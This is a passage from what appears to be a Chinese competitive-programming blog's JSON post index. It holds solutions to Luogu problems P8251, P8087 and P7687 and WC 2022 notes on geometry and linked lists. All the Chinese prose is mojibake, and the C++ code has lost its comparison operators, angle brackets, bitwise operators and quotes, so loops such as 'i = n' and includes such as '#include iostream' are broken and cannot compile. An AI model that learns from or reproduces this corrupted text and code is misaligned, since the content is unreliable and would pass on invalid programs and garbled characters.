åè®°ï¼šç”±äºç¬”è€…è¿˜æ˜¯ä¸ªè’Ÿè’»ï¼Œå€˜è‹¥æœ‰å¤§ä½¬å¯ä»¥å†™å‡ºçŠ¶æ€ $i$ çš„ç¬¬ $j$ ä½æœ‰æ°´æ—¶è®¾ä¸º $1$ æ—¶ä¸”ååˆ†ç®€æ´çš„ä»£ç ï¼ˆæˆ‘å°è¯•äº†å¥½ä¹…ï¼Œä½†æ˜¯ä¸€ç›´æ²¡è°ƒå‡ºæ¥ $\\texttt{qwq}$ï¼‰ï¼Œæ¬¢è¿ç§ä¿¡ï¼","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP8251 [NOI Online 2022 æé«˜ç»„] ä¸¹é’“æˆ˜","path":"/2022/03/27/P8251/","content":"ä¸¹é’“æˆ˜ï¼Œé¡¾åæ€ä¹‰å•è°ƒæ ˆã€‚ é¦–å…ˆæ˜¯ $\\texttt{15 pts}$ åšæ³•ï¼Œå¯¹äºæ¯ä¸ªè¯¢é—®çš„åŒºé—´ï¼Œè¿›è¡Œä¸€æ¬¡å•è°ƒæ ˆçš„æ¨¡æ‹Ÿã€‚æ—¶é—´å¤æ‚åº¦ $O(nq)$ã€‚ ç„¶åå¯ä»¥ç¨å¾®çš„ä¼˜åŒ–ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œ $n$ æ¬¡å•è°ƒæ ˆæ¥ç»´æŠ¤ä»¥ç¬¬ $i$ ä¸ªæ•°ä¸ºèµ·ç‚¹çš„åŒºé—´çš„ç­”æ¡ˆã€‚æ—¶é—´å¤æ‚åº¦ $O(n^2)$ï¼Œé¢„è®¡å¾—åˆ† $\\texttt{30 pts}$ã€‚ æ•°æ®ç‚¹ $11-15$ï¼Œé’ˆå¯¹çš„æ˜¯åºåˆ—çš„ä¸€äº›ç‰¹æ®Šæ€§è´¨ï¼Œä¸æœ€ç»ˆç®—æ³•å¯èƒ½å…³ç³»ä¸å¤§ï¼Œåœ¨æ­¤ä¸èµ˜è¿°ã€‚æ¥ä¸‹æ¥è®²æ­£è§£ã€‚ ä¸€ä¸ªäºŒå…ƒç»„å¦‚æœæ˜¯â€œæˆåŠŸçš„â€ï¼Œé‚£ä¹ˆä¼šæœ‰ä¸€ä¸ªæ˜æ˜¾çš„ç‰¹å¾ï¼Œå°±æ˜¯è¯¥äºŒå…ƒç»„å¯ä»¥å¼¹å‡ºæ‰€æœ‰å…¥æ ˆçš„äºŒå…ƒç»„ï¼Œå¹¶æˆä¸ºå”¯ä¸€çš„äºŒå…ƒç»„è¢«å‹å…¥æ ˆã€‚å½“ç„¶ï¼Œæ ˆä¸ºç©ºæ—¶å°†å…¶å‹å…¥æ ˆä¾¿æ˜¯ä¸€ç§ç‰¹æ®Šçš„æƒ…å†µï¼Œå› æ­¤å¯ä»¥è¯´æ˜¯ä»ç„¶æ»¡è¶³è¯¥ç‰¹å¾ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å®šä¹‰ pre[i] è¡¨ç¤ºç¬¬ $i$ ä¸ªäºŒå…ƒç»„å¯ä»¥å¼¹å‡ºçš„æœ€æ—©çš„äºŒå…ƒç»„æ‰€å¯¹åº”çš„ç¼–å·ï¼Œæ˜¾ç„¶åˆå§‹åŒ–æœ‰ pre[i] = iã€‚è¯¢é—®ä¸€æ®µåŒºé—´ä¸­æœ‰å¤šå°‘ä¸ªäºŒå…ƒç»„ç¬¦åˆé¢˜æ„ï¼Œä¹Ÿå°±æ˜¯æ±‚å‡ºè¯¥åŒºé—´ä¸­çš„ pre[i] æ»¡è¶³å°äºç­‰äºåŒºé—´å·¦ç«¯ç‚¹çš„ä¸ªæ•°ã€‚ä¸¾ä¸ªä¾‹å­ï¼ŒåŒºé—´ $[2,4]$ å¯¹åº”çš„ pre[i] çš„å€¼ä¸º $1,2,3$ï¼Œåˆ™ç¼–å·ä¸º $2,3$ çš„äºŒå…ƒç»„ç¬¦åˆé¢˜æ„ã€‚æ‰€ä»¥è¯´ï¼Œå¯¹äºä¸€ä¸ª pre[i]ï¼Œå®ƒä¼šå¯¹åŒºé—´ [pre[i],i] å‡äº§ç”Ÿè´¡çŒ®ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬åªéœ€è¦æŒ‰ç¼–å·ä»å°æ‰“å¤§æ‰«æä¸€éååˆ†åˆ«æ±‚å‡ºè¯¢é—®å·¦ç«¯ç‚¹å¯¹åº”çš„ç­”æ¡ˆå³å¯ã€‚ é‚£ä¹ˆå¦‚ä½•æ±‚ pre[i] çš„å€¼å‘¢ï¼Œè”ç³»é¢˜ç›®åç§°ï¼Œä¸ç¦å†æ¬¡æƒ³åˆ°å•è°ƒæ ˆã€‚å½“æ ˆé¡¶è¢«å¼¹å‡ºæ—¶ï¼ŒåŒæ—¶æ›´æ–° pre[i] çš„å€¼ä¸º pre[s.top ()] å³å¯ã€‚ç»´æŠ¤äº§ç”Ÿçš„è´¡çŒ®ï¼Œä¸éš¾çœ‹å‡ºæ˜¯åŒºé—´åŠ çš„æ“ä½œï¼Œå½“æ±‚è§£æ—¶ï¼Œåˆæ˜¯å•ç‚¹è¯¢é—®ï¼Œäºæ˜¯æ ‘çŠ¶æ•°ç»„å˜æˆäº†æœ¬é¢˜çš„é¦–é€‰ï¼ˆç é‡å¤§ï¼Œå¸¸æ•°å¤§çš„çº¿æ®µæ ‘é»˜é»˜é è¾¹ï¼‰ã€‚æœ€åéœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ—¶ï¼Œå› åœ¨æ‰«ææ—¶çš„é¡ºåºä¸ºç¼–å·ä»å°åˆ°å¤§ï¼Œè€Œè¯¢é—®æ— åºï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¯¹è¯¢é—®è¿›è¡Œå¤„ç†ï¼Œä»¥å³ç«¯ç‚¹ä¸ºä¸‹æ ‡ï¼Œè®°å½•å·¦ç«¯ç‚¹ï¼Œè¿™æ ·åœ¨æ±‚è§£æ—¶å·¦ç«¯ç‚¹çš„ç­”æ¡ˆå°±å·²ç»è¢«è®¡ç®—å‡ºæ¥äº†ã€‚æ€»æ—¶é—´å¤æ‚åº¦ä¸º $O(n \\log n)$ã€‚ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#include stack#include vector#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 5e5 + 5;const int MOD = 1e9 + 7;inline int read ();vector int point[MAX];stack int s;int n,q,a[MAX],b[MAX],c[MAX],pre[MAX];struct node int l,r,ans; query[MAX];void add (int x,int y);int ask (int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();q = read (); for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = n;++i) b[i] = read (); for (int i = 1;i = q;++i) query[i].l = read (),query[i].r = read (); point[query[i].r].push_back (i);//å³ç«¯ç‚¹ä¸ºä¸‹æ ‡ for (int i = 1;i = n;++i) pre[i] = i;//åˆå§‹åŒ– while (!s.empty () (a[s.top ()] == a[i] || b[s.top ()] = b[i])) pre[i] = pre[s.top ()],s.pop ();//å•è°ƒæ ˆç»´æŠ¤ s.push (i); for (int i = 1;i = n;++i) add (pre[i],1);add (i + 1,-1);//æ ‘çŠ¶æ•°ç»„åŒºé—´æ›´æ–° for (int j = 0;j point[i].size ();++j) query[point[i][j]].ans = ask (query[point[i][j]].l);//å¯¹äºè‹¥å¹²ä¸ªä»¥ i ä¸ºå³ç«¯ç‚¹çš„è¯¢é—®ï¼Œè¿›è¡Œæ±‚è§£ for (int i = 1;i = q;++i) printf (%d ,query[i].ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void add (int x,int y) for (int i = x;i = n;i += (i (-i))) c[i] += y;int ask (int x) int sum = 0; for (int i = x;i;i -= (i (-i))) sum += c[i]; return sum;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP8087 ã€JROI-5ã€Interval","path":"/2022/02/02/P8087/","content":"è¿™æ˜¯ä¸€é“ä¸é”™çš„æ€ç»´é¢˜ï¼Œèµ›æ—¶æˆ‘çš„æ€è·¯æ˜¯é€†å‘æ€ç»´æ³•ã€‚ä»é•¿åº¦ä¸º $n$ çš„åˆæ³•åŒºé—´å¼€å§‹åˆ¤æ–­ï¼Œå› ä¸ºç”± $f_{r - l + 1} \\rm Mex_{l,r}$å¯çŸ¥ï¼Œè‹¥è®©åŒºé—´æˆä¸ºåˆæ³•åŒºé—´ï¼Œéœ€è¦ä½¿ $\\rm Mex_{l,r}$ å°½å¯èƒ½å¤§ã€‚æ‰€ä»¥å°±æœ‰äº†ä¸€ä¸ªç­–ç•¥ï¼šä»é•¿åº¦ä¸º $n$ çš„åŒºé—´å¼€å§‹ï¼Œè‹¥ä¸ºåˆæ³•åŒºé—´åˆ™æ›´æ–°ç­”æ¡ˆï¼Œå¦åˆ™å»é™¤ä¸¤ç«¯çš„è¾ƒå¤§æ•°ï¼Œç›´è‡³åŒºé—´ä¸º $1$ã€‚ è€Œå¯¹äº $k = \\rm Mex_{l,r}$ çš„æ›´æ–°ä¹Ÿå¾ˆç®€å•ï¼Œç”±äºé€†ç€æ“ä½œï¼Œæ‰€ä»¥ä¸€å¼€å§‹çš„å€¼ä¸º $n + 1$ï¼Œå½“å»é™¤æ•°å­—ä¹‹åï¼Œç›´æ¥æ›´æ–°ä¸º $\\min (k,x)$ï¼Œ$x$ è¡¨ç¤ºè¢«å»é™¤çš„æ•°å­—ã€‚ æ€è·¯ååˆ†ç®€å•ä¸”æ¸…æ™°ï¼Œé‚£ä¹ˆç›´æ¥ç»™å‡ºä»£ç ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 4e6 + 5;const int MOD = 1e9 + 7;inline int read ();int n,k,l,r,ans = INF;int a[MAX],f[MAX];int main () n = read (); for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = n;++i) f[i] = read (); k = n + 1;//k ä»£è¡¨ Mex å‡½æ•°çš„å€¼ï¼Œä¸€å¼€å§‹ä¸º n + 1 l = 1;r = n; for (int i = n;i = 1;--i)//é€†å‘æ€ç»´ if (f[i] k) ans = min (ans,r - l + 1);//å­˜åœ¨åˆæ³•åŒºé—´ï¼Œç­”æ¡ˆè¢«æ›´æ–° if (a[l] a[r]) k = min (k,a[r--]);//å³ä¾§ç«¯è¾ƒå¤§ï¼Œå»é™¤å³ä¾§çš„æ•°å­—ï¼ŒåŒæ—¶ k è¿›è¡Œæ›´æ–° else k = min (k,a[l++]);//å»é™¤å·¦ç«¯ if (ans == INF) printf (0 );//ç­”æ¡ˆæœªè¢«æ›´æ–°ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰åˆæ³•åŒºé—´ else printf (%d ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP7687 [CEOI2005] Critical Network Lines","path":"/2022/01/24/P7687/","content":"è¿™é“é¢˜å’Œæ±‚æ™®é€šçš„å‰²è¾¹ååˆ†ç›¸ä¼¼ã€‚æœ€å¼€å§‹çš„æ€è·¯å°±æ˜¯å°† $a$ å’Œ $b$ çš„æƒ…å†µåˆ†åˆ«æ±‚è§£ï¼Œç„¶åå†è¿›è¡Œåˆå¹¶ï¼Œç„¶è€Œè¿™æ ·å¹¶ä¸è¡Œã€‚ æœ¬é¢˜çš„å…³é”®é€šä¿¡çº¿è·¯å’Œå‰²è¾¹å¹¶ä¸æ˜¯å……è¦æ¡ä»¶ï¼Œè€Œæ˜¯å……åˆ†ä¸å¿…è¦æ¡ä»¶ã€‚æœ‰äº›è¾¹è™½ç„¶æ˜¯å‰²è¾¹ï¼Œä½†è¯¥è¾¹å°†æ‰€æœ‰ç‚¹åˆ†ä¸ºä¸¤éƒ¨åˆ†åæ¯éƒ¨åˆ†å‡æœ‰ $A$ ä¸ $B$ï¼Œå› æ­¤å¹¶ä¸æ˜¯å…³é”®é€šä¿¡çº¿è·¯ã€‚ä»¥ $A$ ä¸ºä¾‹ï¼Œè‹¥æŸæ¡å‰²è¾¹æ˜¯å…³é”®é€šä¿¡çº¿è·¯ï¼Œåˆ™å¿…æœ‰ä¸€éƒ¨åˆ†å…¨æ˜¯ $A$ï¼Œå¦ä¸€éƒ¨åˆ†æ²¡æœ‰ $A$ï¼Œ$B$ åŒç†ã€‚è€Œç»Ÿè®¡å­æ ‘ä¸­å«æœ‰ $A,B$ çš„ç»“ç‚¹æ•°ä¹Ÿååˆ†å®¹æ˜“ï¼Œå’Œæ±‚å­æ ‘å¤§å°ç±»ä¼¼ï¼Œé€šè¿‡é€’å½’ä¸æ–­ç´¯åŠ å³å¯ã€‚ å’Œæ±‚æ™®é€šçš„å‰²è¾¹å”¯ä¸€ä¸åŒçš„ä»£ç åœ¨äºåˆ¤æ–­æ˜¯å¦ä¸ºç‰¹æ®Šè¾¹æ—¶ï¼Œå†åŠ ä¸Š !a[v] || a[v] == k || !b[v] || b[v] == l å…³äº $A,B$ æ•°é‡çš„åˆ¤æ–­å°±è¡Œäº†ã€‚ç”±äºæœ‰ $\\texttt{Special Judge}$ çš„è®¾ç½®ï¼Œåœ¨ç­”æ¡ˆç´¯åŠ çš„åŒæ—¶ç›´æ¥ç”¨ä¸€ä¸ª pair è®°å½•è¯¥è¾¹ç›¸é‚»çš„ä¸¤ä¸ªç»“ç‚¹å°±è¡Œäº†ã€‚ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,m,k,l,cnt,times,ans;int dfn[MAX],low[MAX],a[MAX],b[MAX];int head[MAX * 20],to[MAX * 20],nxt[MAX * 20];pair int,int edge[MAX];void add (int u,int v); void tarjan (int u,int fa);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read ();k = read ();l = read (); for (int i = 1;i = k;++i) a[read ()] = 1; for (int i = 1;i = l;++i) b[read ()] = 1; for (int i = 1;i = m;++i) int x = read (),y = read (); add (x,y);add (y,x); tarjan (1,0); printf (%d ,ans); for (int i = 1;i = ans;++i) printf (%d %d ,edge[i].first,edge[i].second); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void add (int u,int v) to[++cnt] = v; nxt[cnt] = head[u]; head[u] = cnt;void tarjan (int u,int fa) dfn[u] = low[u] = ++times; for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (!dfn[v]) tarjan (v,u); low[u] = min (low[u],low[v]); if (low[v] dfn[u] (!a[v] || a[v] == k || !b[v] || b[v] == l)) edge[++ans] = make_pair (u,v);//å”¯ä¸€ä¸åŒçš„åœ°æ–¹åœ¨è¿™é‡Œ a[u] += a[v],b[u] += b[v];//é€’å½’ç´¯åŠ çš„è¿‡ç¨‹ else if (v != fa) low[u] = min (low[u],dfn[v]);","categories":["Solution"]},{"title":"WC 2022 å­¦ä¹ ç¬”è®°","path":"/2022/01/22/WC2022/","content":"$\\texttt{Day 1 2022.01.22}$ å¼€å¹•å¼ï¼Œå¥½è€¶ï¼ $\\texttt{Day 2 2022.01.23}$ ä¸Šåˆæ‰çŸ¥é“è¯¾ç¨‹éƒ½æ˜¯äºŒé€‰ä¸€ï¼Œé€‰äº†ä¸ªç¬¬äºŒè¯¾å ‚å¬å¬ã€‚ å‰ç½® å‘é‡åŠ å‡ \\begin{cases} p = (x_1,y_1),q = (x_2,y_2)\\\\ p + q = (x_1 + x_2,y_1 + y_2)\\\\ p - q = (x_1 - x_2,y_1 - y_2) \\end{cases} å‘é‡ç‚¹ç§¯ã€æ ‡é‡ã€‘ \\begin{cases} \\overrightarrow{AB} \\cdot \\overrightarrow{CD} = x_1x_2 + y_1y_2\\\\ \\overrightarrow{AB} \\cdot \\overrightarrow{CD} = |AB||CD| \\cos \\theta \\end{cases} å‘é‡å‰ç§¯ã€çŸ¢é‡ã€‘ \\begin{cases} \\overrightarrow{AB} \\times \\overrightarrow{CD} = x_1y_2 - x_2y_1\\\\ \\overrightarrow{AB} \\times \\overrightarrow{CD} = |AB||CD|\\sin \\theta \\end{cases}åŒæ—¶æœ‰ $\\textbf{0} \\times \\textbf{a} = \\textbf{a} \\times \\textbf{0} = \\textbf{a} \\times \\textbf{a} = \\textbf{0}$ã€‚ $|\\textbf{a} \\times \\textbf{b}|$ åœ¨æ•°å€¼ä¸Šç­‰äº $\\textbf{a},\\textbf{b}$ æ„æˆçš„å¹³è¡Œå››è¾¹å½¢çš„é¢ç§¯ã€‚ å‘é‡æ—‹è½¬ $\\textbf{a} = (x,y)$ï¼Œé€†æ—¶é’ˆæ—‹è½¬ $\\theta$ åä¸º $\\textbf{aâ€™} = (x \\cos \\theta - y \\sin \\theta,x \\sin \\theta + y\\cos \\theta)$ã€‚ å¤šè¾¹å½¢é¢ç§¯ $S = \\frac{1}{2}|\\sum_{i = 1}^{n} V_i \\times V_i \\mod n + 1|$ æåæ ‡ä¸æåæ ‡ç³» è¯¯å·®åˆ¤æ–­ double eps = 1e-8;return (x eps) - (x eps); è·ç¦» æ¬§å¼è·ç¦» äºŒç»´ $|AB| = \\sqrt{(x_2 - x_1)^2 + (y_2 - y_1)^2}$ ä¸‰ç»´ $|AB| = \\sqrt{(x_2 - x_1)^2 + (y_2 - y_1)^2 + (z_2 - z_1)^2}$ æ›¼å“ˆé¡¿è·ç¦» $d(A,B) = |x_1 - x_2| + |y_1 - y_2|$ åˆ‡æ¯”é›ªå¤«è·ç¦» $d(A,B) = \\max (|x_1 - x_2|,|y_1 - y_2|)$ æ›¼å“ˆé¡¿è·ç¦»ä¸åˆ‡æ¯”é›ªå¤«è·ç¦»çš„è”ç³» æ›¼å“ˆé¡¿è·ç¦» $\\to$ åˆ‡æ¯”é›ªå¤«è·ç¦»ï¼š$(x,y) \\to (x + y,x - y)$ åˆ‡æ¯”é›ªå¤«è·ç¦» $\\to$ æ›¼å“ˆé¡¿è·ç¦»ï¼š$(x,y) \\to (\\dfrac{x + y}{2},\\dfrac{x - y}{2})$ã€‚å³æ—‹è½¬ $\\frac{\\pi}{4}$ åç¼©å°ä¸€åŠã€‚ åˆ¤æ–­ ç‚¹æ˜¯å¦åœ¨ç›´çº¿ä¸Š â‘  $(Q - P_1) \\times (P_2 - P_1) = 0$â‘¡ $Q$ åœ¨ä»¥ $P_1,P_2$ ä¸ºå¯¹è§’é¡¶ç‚¹çš„çŸ©å½¢å†… ä¸¤çº¿æ®µæ˜¯å¦ç›¸äº¤ â‘  å¿«é€Ÿæ’æ–¥è¯•éªŒ è‹¥ä¸¤çŸ©å½¢ä¸ç›¸äº¤ï¼Œåˆ™çº¿æ®µä¸ç›¸äº¤â‘¡ è·¨ç«‹å®éªŒ $(P_1 - Q_1) \\times (Q_2 - Q_1) \\ge 0$ å’Œ $ (Q_2 - Q_1) \\times (P_2 - Q_1) \\ge 0$ çº¿æ®µå’Œç›´çº¿æ˜¯å¦ç›¸äº¤ åªéœ€ç”¨è·¨ç«‹å®éªŒåˆ¤æ–­å³å¯ã€‚ ç‚¹æ˜¯å¦åœ¨å¤šè¾¹å½¢ä¸­ ä»¥ $p$ ä¸ºç«¯ç‚¹ï¼Œå‘å·¦æ–¹ä½œå°„çº¿ $L$ï¼Œæ ¹æ®äº¤ç‚¹ä¸ªæ•°çš„å¥‡å¶æ€§åˆ¤æ–­ã€‚ä½†éœ€è¦æ³¨æ„ä¸é¡¶ç‚¹ç›¸äº¤ã€ä¸è¾¹é‡åˆçš„ç‰¹æ®Šæƒ…å†µã€‚ çº¿æ®µæ˜¯å¦åœ¨å¤šè¾¹å½¢å†… â‘  ä¸¤çº¿æ®µç«¯ç‚¹åœ¨å¤šè¾¹å½¢å†…â‘¡ çº¿æ®µä¸å¤šè¾¹å½¢æ‰€æœ‰è¾¹éƒ½ä¸å†…äº¤ï¼ˆä¸¤çº¿æ®µç›¸äº¤ä¸”äº¤ç‚¹ä¸åœ¨ä¸¤çº¿æ®µçš„ç«¯ç‚¹ï¼‰ åšæ³•æ˜¯æ±‚å‡ºæ‰€æœ‰ä¸çº¿æ®µç›¸äº¤çš„é¡¶ç‚¹ï¼Œç„¶åæŒ‰ç…§ $(x,y)$ æ’åºï¼Œè‹¥ç›¸é‚»ä¸¤ç‚¹ä¸­ç‚¹å‡åœ¨å¤šè¾¹å½¢å†…ï¼Œåˆ™ç¬¦åˆæ¡ä»¶ã€‚ è®¡ç®— ç‚¹åˆ°çº¿æ®µçš„æœ€è¿‘ç‚¹ è®¡ç®—ç‚¹åˆ°æŠ˜çº¿/çŸ©å½¢/å¤šè¾¹å½¢çš„æœ€è¿‘ç‚¹ è®¡ç®—ç‚¹åˆ°åœ†çš„æœ€è¿‘è·ç¦»åŠäº¤ç‚¹åæ ‡ æ±‚çº¿æ®µæˆ–ç›´çº¿ä¸åœ†çš„äº¤ç‚¹ å‡å¯åˆ†ä¸ºæ˜¯å¦ä¸åæ ‡è½´å¹³è¡Œçš„ä¸¤ç§æƒ…å†µã€‚å¯¹äºä¸å¹³è¡Œçš„è¾ƒå¤æ‚æƒ…å†µï¼Œé€šè§£ä¸ºè”ç«‹è§£æ–¹ç¨‹ç»„ç„¶åæ±‚å‡ºäº¤ç‚¹ã€‚ å¤šè¾¹å½¢ äºŒç»´å‡¸åŒ… ä¾‹é¢˜ P2742 [USACO5.1]åœˆå¥¶ç‰›Fencing the Cows /ã€æ¨¡æ¿ã€‘äºŒç»´å‡¸åŒ… â‘  Andrew ç®—æ³• ç”¨å•è°ƒæ ˆç»´æŠ¤ï¼Œæ—¶é—´å¤æ‚åº¦ $O(n \\log n)$ã€‚â‘¡ Graham æ‰«æç®—æ³• æ‰¾åˆ°å·¦ä¸‹è§’çš„ç‚¹ï¼Œç„¶åæŒ‰æè§’æ’åºã€‚ æ—‹è½¬å¡å£³ ä¾‹é¢˜ P1452 [USACO03FALL]Beauty Contest G /ã€æ¨¡æ¿ã€‘æ—‹è½¬å¡å£³ é€†æ—¶é’ˆæšä¸¾å‡¸åŒ…è¾¹ï¼Œè®°å½•å¹¶ç»´æŠ¤ä¸€ä¸ªå½“å‰çš„æœ€è¿‘ç‚¹ï¼ˆæ ¹æ®å‰ç§¯è®¡ç®—ä¸‰è§’å½¢é¢ç§¯ï¼‰ åŠå¹³é¢äº¤ ä¾‹é¢˜ P4196 [CQOI2006]å‡¸å¤šè¾¹å½¢ /ã€æ¨¡æ¿ã€‘åŠå¹³é¢äº¤ \\begin{cases} A_1x + B_1y + C_1 \\ge 0\\\\ A_2x + B_2y + C_2 \\ge 0\\\\ \\cdots\\\\ A_nx + B_ny + C_n \\ge 0 \\end{cases}$S \\ I$ ç®—æ³• æè§’æ’åºï¼Œç„¶åç»´æŠ¤å•è°ƒé˜Ÿåˆ—ï¼ˆæ³¨æ„å…ˆåˆ¤æ–­é˜Ÿå°¾å†åˆ¤æ–­é˜Ÿé¦–çš„æƒ…å†µï¼‰ å¹³é¢æœ€è¿‘ç‚¹å¯¹ ä¾‹é¢˜ P7883 å¹³é¢æœ€è¿‘ç‚¹å¯¹ åˆ†æ²»çš„æ€æƒ³ï¼Œä»¥ $P_m$ ä¸ºç•Œï¼Œæ‹†åˆ†å‡ºç‚¹é›† $A_1,A_2$ï¼Œç„¶ååˆ†åˆ«æ‰¾æœ€è¿‘ç‚¹å¯¹ï¼Œè·ç¦»ä¸º $h$ã€‚å†æ‰¾ä¸€ä¸ªç‚¹åœ¨ $A_1$ï¼Œå¦ä¸€ä¸ªåœ¨ $A_2$ çš„å°äº $h$ çš„ç‚¹å¯¹ã€‚æœ€åçš„æ—¶é—´å¤æ‚åº¦ä¸º $O(n \\log n)$ã€‚ ä¸‹åˆæœ‰å…³é“¾è¡¨çš„å†…å®¹ã€‚ åŒå‘é“¾è¡¨ æ’å…¥ data[s] = x;left[s] = left[p];right[left[p]] = s;right[s] = p;left[p] = s; åˆ é™¤ right[left[p]] = right[p];left[right[p]] = left[p]; æ¢å¤ right[left[p]] = p;left[right[p]] = p; èˆè¹ˆé“¾P4929 ã€æ¨¡æ¿ã€‘èˆè¹ˆé“¾ï¼ˆDLXï¼‰ ä¸€ä¸ªè¿ç”¨é“¾è¡¨åˆ°æè‡´çš„ä¾‹å­ã€‚ä¸»è¦æ­¥éª¤å¦‚ä¸‹ï¼š â‘  çŸ©é˜µ $A$ ä¸ºç©ºï¼Œè¿”å›å·²è§£å†³ã€‚ â‘¡ é€‰æ‹©ä¸€åˆ— $c$ï¼Œé€šå¸¸é€‰æ‹© $1$ çš„ä¸ªæ•°æœ€å°‘çš„é‚£ä¸€åˆ—ã€‚ â‘¢ a. è‹¥ $A_{r,c} = 1$ï¼Œè¯´æ˜è¡Œ $r$ å­˜åœ¨ï¼Œè¿›å…¥ â‘£ï¼›b. ä¸å­˜åœ¨ï¼Œå›æº¯ï¼Œå›æº¯åˆ é™¤ï¼Œè¿›å…¥ â‘¢ a.ã€‚ â‘£ æŠŠ $r$ åŒ…å«è¿›éƒ¨åˆ†è§£ã€‚ â‘¤ å¯¹äº $\\forall j,A_{r,j} = 1$ï¼Œè‹¥ $\\forall i,A_{i,j} = 1$ï¼Œåˆ é™¤ç¬¬ $i$ è¡Œï¼Œå¦åˆ™åˆ é™¤ç¬¬ $j$ è¡Œã€‚ â‘¥ é‡å¤é€’å½’ã€‚ èˆè¹ˆé“¾çš„æ€æƒ³è¿˜å¯ä»¥è¿ç”¨åˆ°åˆ«çš„é—®é¢˜ä¸­å»ã€‚æˆ‘ä»¬å°†çŸ©é˜µçš„è¡Œçš„æ„ä¹‰ä¸ºæ‰€æœ‰çš„æƒ…å†µï¼Œåˆ—çš„æ„ä¹‰ä¸ºçº¦æŸæ¡ä»¶ã€‚ $N$ çš‡åé—®é¢˜ å…±æœ‰ $n^2$ ä¸ªæ ¼å­ï¼Œæ‰€ä»¥çŸ©é˜µå…±æœ‰ $n^2$ è¡Œã€‚è€Œå› æ¯è¡Œæ¯åˆ—æ¯æ–œè¡Œåªèƒ½æœ‰ä¸€ä¸ªçš‡åçš„çº¦æŸæ¡ä»¶ï¼Œæ‰€ä»¥æœ‰ $n$ è¡Œ $n$ åˆ—ï¼Œ$2n - 1$ æ¡ä¸»å¯¹è§’çº¿ä¸å‰¯å¯¹è§’çº¿ï¼Œå³çŸ©é˜µå…±æœ‰ $6n - 2$ åˆ—ã€‚ æ•°ç‹¬ å…ˆåˆ†æè¡Œï¼Œå…±æœ‰ $9 \\times 9$ ä¸ªæ ¼å­ï¼Œå¯ä»¥å¡«å…¥æ•°å­— $1$ è‡³ $9$ï¼Œæ‰€ä»¥å…±æœ‰ $9 \\times 9 \\times 9 = 729$ è¡Œã€‚ æ¯ä¸€ä¸ªæ ¼å­éƒ½éœ€è¦å¡«å…¥æ•°å­—ï¼Œæ‰€ä»¥è¦æœ‰ $9 \\times 9$ åˆ—å­˜æ”¾æ˜¯å¦å·²ç»å¡«å…¥æ•°å­—çš„ä¿¡æ¯ã€‚æ¥ä¸‹å»çš„ $3$ ä¸ª $9 \\times 9$ åˆ—ï¼Œåˆ†åˆ«è®°å½•è¡Œã€åˆ—ã€å®«çš„æ•°å­—æ”¾ç½®æƒ…å†µã€‚æ‰€ä»¥å…±éœ€è¦ $4 \\times 81 = 324$ åˆ—ã€‚ è·³è¡¨ä¾‹é¢˜ P3103 [USACO14FEB]Airplane Boarding G è·³è¡¨å¯ä»¥å®ç°é“¾è¡¨ä¸­çš„å¿«é€ŸæŸ¥æ‰¾ï¼Œä»ç¬¬ä¸€ä¸ªä½ç½®çš„é¡¶ç«¯å¼€å§‹ä¸€å±‚å±‚å¾€ä¸‹è·³ï¼Œç›´è‡³è¿”å› $x$ ä¸å­˜åœ¨ã€‚æ—¶é—´å¤æ‚åº¦ä¸º $O(\\log n)$ï¼Œç©ºé—´å¤æ‚åº¦ä¸º $O(n)$ã€å»ºç«‹åœ¨éšæœºé€‰æ‹©æ’å…¥å±‚çš„å‰æä¸‹ã€‘ã€‚ ä¾‹é¢˜é€‰è®²æ²¡å¬çš„å¤ªæ˜ç™½ï¼ˆå…¶å®è·³è¡¨ä¹Ÿä¸æ˜¯å¾ˆæ˜ç™½ï¼‰ï¼Œé€‰å‡ é“æ´›è°·ä¸Šæœ‰çš„é¢˜ç›®åˆ—ä¸€ä¸‹ã€‚ P7988 [USACO21DEC] HILO G P1792 [å›½å®¶é›†è®­é˜Ÿ]ç§æ ‘ æ™šä¸Šè¥å‘˜äº¤æµï¼Œå±äºæ˜¯åœ¨å¬å¤©ä¹¦ã€‚å‡ ä¹å±äºå¬ä¸æ‡‚çš„çŠ¶æ€ï¼Œä¹Ÿå°±å½“é•¿é•¿è§è¯†äº† $\\texttt{qwq}$ã€‚ ä»Šå¤©ä¸€å¤©ç´¯è®¡ç®—æ˜¯å¬äº† $9$ ä¸ªå¤šå°æ—¶ï¼Œä¼‘æ¯å»äº†ï¼$\\texttt{Day 2}$ ç»“æŸã€‚ $\\texttt{Day 3 